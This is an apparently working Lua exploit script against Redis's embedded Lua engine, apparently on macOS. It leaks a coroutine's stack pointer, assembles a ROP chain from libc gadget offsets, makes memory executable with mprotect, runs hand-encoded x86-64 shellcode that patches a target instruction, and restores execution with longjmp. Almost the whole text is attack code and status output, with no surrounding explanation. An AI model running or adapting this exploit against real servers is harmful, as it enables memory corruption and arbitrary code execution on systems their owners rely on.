named_rops[string.char(0x5B, 0x41, 0x5E, 0x5D, 0xC3)] = {name = "poprbxpopr14poprbp", offsets = {0x1b81,0x1449}}
named_rops[string.char(0x4C, 0x89, 0xF2, 0xFF, 0xD3)] = {name = "movrdxr14callrbx", offsets = {0x642f4,0x604f0}}

local target_instruction = find_fparser_cmp(program_information)

local libc_text_segment = libc_segments["__TEXT"]

-- we assume vm_addr == 0

local libc_text_stream = new_lazy_stream(program_information.libsystem_c, toint(libc_text_segment.vm_size))

local rop_addresses = find_rops_and_assert(named_rops, libc_text_stream, program_information.libsystem_c)

local poprbp = addint(rop_addresses.poprsipoprbp, 1)


local dummy = '\1\1\1\1\1\1\1\1'
local null = '\0\0\0\0\0\0\0\0'



local shellcode = nil

local payload_str = nil

local old_jump_buf = nil

collectgarbage()

co = coroutine.create(function ()
  local stack_pointer = read_word(addbyte(asstring(co), 8 * 21))
  print("[*] leaked stack pointer: " .. dump8(stack_pointer))

  local jmp_buf_eip = addint(stack_pointer, 64)
  local jmp_buf_sp = addint(stack_pointer, 24)

  local existing_eip = read_word(jmp_buf_eip)

  print("[*] old jump_buf eip " .. dump8(existing_eip))

  local existing_sp = read_word(jmp_buf_sp)

  print("[*] existing sp " .. dump8(existing_sp))



  old_jump_buf = copy_words(stack_pointer, 48)


  local old_jump_buf_addr = addint(cstring(old_jump_buf), 8)

  shellcode =
    -- 48 bf VALUE    movabs    rdi,VALUE
    string.char(0x48,0xbf) .. pagealign(target_instruction) ..
    -- 48 c7 c6 00 20 00 00    mov    rsi,0x2000
    string.char(0x48, 0xc7, 0xc6, 0x00, 0x20, 0x00, 0x00) ..
    -- 48 c7 c2 07 00 00 00    mov    rdx,0x7
    string.char(0x48, 0xc7, 0xc2, 0x07, 0x00, 0x00, 0x00) ..

    -- 48 b8 VALUE movabs rax, VALUE
    string.char(0x48, 0xb8) .. mprotect_addr ..

    -- ff d0                   call   rax

    string.char(0xff, 0xd0) ..

    -- 48 bf VALUE    movabs    rdi,VALUE
    string.char(0x48,0xbf) .. target_instruction ..

    -- c7 07 VALUE       mov    DWORD PTR [rdi],VALUE

    string.char(0xc7, 0x07) .. string.char(0x48, 0x83, 0xfc, 0x1b) ..

    -- restore permissions

    -- 48 bf VALUE    movabs    rdi,VALUE
    string.char(0x48,0xbf) .. pagealign(target_instruction) ..
    -- 48 c7 c6 00 20 00 00    mov    rsi,0x2000
    string.char(0x48, 0xc7, 0xc6, 0x00, 0x20, 0x00, 0x00) ..
    -- 48 c7 c2 05 00 00 00    mov    rdx,0x5
    string.char(0x48, 0xc7, 0xc2, 0x05, 0x00, 0x00, 0x00) ..

    -- ret
    string.char(0xc3)

  local shellcode_ptr = cstring(shellcode)

  print("[*] shellcode_ptr " .. dump8(shellcode_ptr))

  local rdi = pagealign(shellcode_ptr)
  local rsi = tob8(8192)
  local rdx_all = tob8(7) -- PROT_READ | PROT_WRITE | PROT_EXEC
  local rdx_read_write = tob8(3) -- PROT_READ | PROT_WRITE

  local payload = {
          --[[ padding for our fake stack. `system` calls into the dynamic linker because of stubbed crap. so stack can get quite big. 1024 bytes => stack overflow and corruption of lua/redis heap ]]
          "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX",
          "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX",
          "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX",
          "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX",

          "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX",
          "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX",
          "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX",
          "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX",

           --[[ poprdipoprbp, ]] rdi, dummy,
           rop_addresses.poprsipoprbp, rsi, dummy,
           rop_addresses.poprbxpopr14poprbp, poprbp, rdx_all, dummy,
           rop_addresses.movrdxr14callrbx,
           mprotect_addr,

           shellcode_ptr,

           rop_addresses.poprdipoprbp, rdi, dummy,
           rop_addresses.poprsipoprbp, rsi, dummy,
           rop_addresses.poprbxpopr14poprbp, poprbp, rdx_read_write, dummy,
           rop_addresses.movrdxr14callrbx,
           mprotect_addr,

           rop_addresses.poprdipoprbp, old_jump_buf_addr, dummy,
           longjmp_addr,

           "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
         }

  payload_str = table.concat(payload, "")

  local payload_string_addr = addint(cstring(payload_str), 4096)

  print("[*] new sp " .. dump8(payload_string_addr))

  --[[ TODO: we always seem to get back strings that are correctly 16 byte aligned. handle unaligned strings? ]]
  if (string.byte(payload_string_addr, 1) % 16) ~= 8 then
    fail("payload not aligned")
  end


  write_word(jmp_buf_sp, payload_string_addr)
  write_word(jmp_buf_eip, rop_addresses.poprdipoprbp)

  --[[ you can also overwrite the SP at stackpointer - 16 .
  but if we corrupt long jump then it is possible to return back into redis :) ]]

  print("[*] executing payload")
  error("wat")
end)

coroutine.resume(co)

print("[*] resumed normal redis execution")

collectgarbage()

return 42

```

